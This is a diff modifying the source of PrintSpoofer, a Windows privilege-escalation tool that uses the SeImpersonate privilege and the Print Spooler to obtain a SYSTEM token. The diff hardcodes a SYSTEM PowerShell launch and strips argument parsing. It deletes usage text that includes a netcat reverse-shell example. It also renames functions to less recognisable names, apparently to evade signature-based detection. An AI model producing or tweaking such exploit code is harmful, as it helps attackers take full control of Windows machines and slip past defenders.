@@ -12,75 +12,25 @@
 #pragma comment(lib, "userenv.lib")
 #pragma warning( disable : 28251 )
 
-BOOL g_bInteractWithConsole = FALSE;
+BOOL g_bInteractWithConsole = TRUE;
 DWORD g_dwSessionId = 0;
 LPWSTR g_pwszCommandLine = NULL;
 
 int wmain(int argc, wchar_t** argv)
 {
-	while ((argc > 1) && (argv[1][0] == '-'))
-	{
-		switch (argv[1][1])
-		{
-		case 'h':
-			PrintUsage();
-			return 0;
-		case 'i':
-			g_bInteractWithConsole = TRUE;
-			break;
-		case 'd':
-			++argv;
-			--argc;
-			if (argc > 1 && argv[1][0] != '-')
-			{
-				g_dwSessionId = wcstoul(argv[1], NULL, 0);
-				if (!g_dwSessionId)
-				{
-					wprintf(L"[-] Invalid session id: %ws\n", argv[1]);
-					PrintUsage();
-					return -1;
-				}
-			}
-			else
-			{
-				wprintf(L"[-] Missing value for option: -d\n");
-				PrintUsage();
-				return -1;
-			}
-			break;
-		case 'c':
-			++argv;
-			--argc;
-			if (argc > 1 && argv[1][0] != '-')
-			{
-				g_pwszCommandLine = argv[1];
-			}
-			else
-			{
-				wprintf(L"[-] Missing value for option: -c\n");
-				PrintUsage();
-				return -1;
-			}
-			break;
-		default:
-			wprintf(L"[-] Invalid argument: %ls\n", argv[1]);
-			PrintUsage();
-			return -1;
-		}
-
-		++argv;
-		--argc;
-	}
-
-	if (g_bInteractWithConsole && g_dwSessionId)
-	{
-		wprintf(L"[-] More than one interaction mode was specified.\n");
-		return -1;
-	}
-
+	wprintf(L"test");
+	size_t commandLen = wcslen(L"powershell.exe") + 1;
+	g_pwszCommandLine = (LPWSTR)malloc(commandLen * sizeof(wchar_t));
 	if (!g_pwszCommandLine)
 	{
-		wprintf(L"[-] Please specify a command to execute\n");
+		wprintf(L"[-] Memory allocation failed\n");
+		return -1;
+	}
+	wcscpy_s(g_pwszCommandLine, commandLen, L"powershell.exe");
+
+	// Arguments have been hardcoded above, so no need for parsing
+	if (!g_pwszCommandLine)
+	{
 		return -1;
 	}
 
@@ -89,34 +39,8 @@ int wmain(int argc, wchar_t** argv)
 
 VOID PrintUsage()
 {
-	wprintf(
-		L"\n"
-		"PrintSpoofer v%ws (by @itm4n)\n"
-		"\n"
-		"  Provided that the current user has the SeImpersonate privilege, this tool will leverage the Print\n"
-		"  Spooler service to get a SYSTEM token and then run a custom command with CreateProcessAsUser()\n"
-		"\n",
-		VERSION
-	);
-	wprintf(
-		L"Arguments:\n"
-		"  -c <CMD>    Execute the command *CMD*\n"
-		"  -i          Interact with the new process in the current command prompt (default is non-interactive)\n"
-		"  -d <ID>     Spawn a new process on the desktop corresponding to this session *ID* (check your ID with qwinsta)\n"
-		"  -h          That's me :)\n"
-		"\n"	
-	);
-
-	wprintf(
-		L"Examples:\n"
-		"  - Run PowerShell as SYSTEM in the current console\n"
-		"      PrintSpoofer.exe -i -c powershell.exe\n"
-		"  - Spawn a SYSTEM command prompt on the desktop of the session 1\n"
-		"      PrintSpoofer.exe -d 1 -c cmd.exe\n"
-		"  - Get a SYSTEM reverse shell\n"
-		"      PrintSpoofer.exe -c \"c:\\Temp\\nc.exe 10.10.13.37 1337 -e cmd\"\n"
-		"\n"
-	);
+	
+	
 }
 
 DWORD DoMain()
@@ -127,7 +51,7 @@ DWORD DoMain()
 	HANDLE hSpoolTriggerThread = INVALID_HANDLE_VALUE;
 	DWORD dwWait = 0;
 
-	if (!CheckAndEnablePrivilege(NULL, SE_IMPERSONATE_NAME))
+	if (!chkPriv(NULL, SE_IMPERSONATE_NAME))
 	{
 		wprintf(L"[-] A privilege is missing: '%ws'\n", SE_IMPERSONATE_NAME);
 		goto cleanup;
@@ -135,13 +59,13 @@ DWORD DoMain()
 
 	wprintf(L"[+] Found privilege: %ws\n", SE_IMPERSONATE_NAME);
 
-	if (!GenerateRandomPipeName(&pwszPipeName))
+	if (!genPipeNm(&pwszPipeName))
 	{
 		wprintf(L"[-] Failed to generate a name for the pipe.\n");
 		goto cleanup;
 	}
 
-	if (!(hSpoolPipe = CreateSpoolNamedPipe(pwszPipeName)))
+	if (!(hSpoolPipe = createSpooPipe(pwszPipeName)))
 	{
 		wprintf(L"[-] Failed to create a named pipe.\n");
 		goto cleanup;
@@ -181,7 +105,7 @@ cleanup:
 	return 0;
 }
 
-BOOL CheckAndEnablePrivilege(HANDLE hTokenToCheck, LPCWSTR pwszPrivilegeToCheck)
+BOOL chkPriv(HANDLE hTokenToCheck, LPCWSTR pwszPrivilegeToCheck)
 {
 	BOOL bResult = FALSE;
 	HANDLE hToken = INVALID_HANDLE_VALUE;
@@ -283,7 +207,7 @@ cleanup:
 	return bResult;
 }
 
-BOOL GenerateRandomPipeName(LPWSTR *ppwszPipeName)
+BOOL genPipeNm(LPWSTR *ppwszPipeName)
 {
 	UUID uuid = { 0 };
 
@@ -299,7 +223,7 @@ BOOL GenerateRandomPipeName(LPWSTR *ppwszPipeName)
 	return TRUE;
 }
 
-HANDLE CreateSpoolNamedPipe(LPWSTR pwszPipeName)
+HANDLE createSpooPipe(LPWSTR pwszPipeName)
 {
 	HANDLE hPipe = NULL;
 	LPWSTR pwszPipeFullname = NULL;
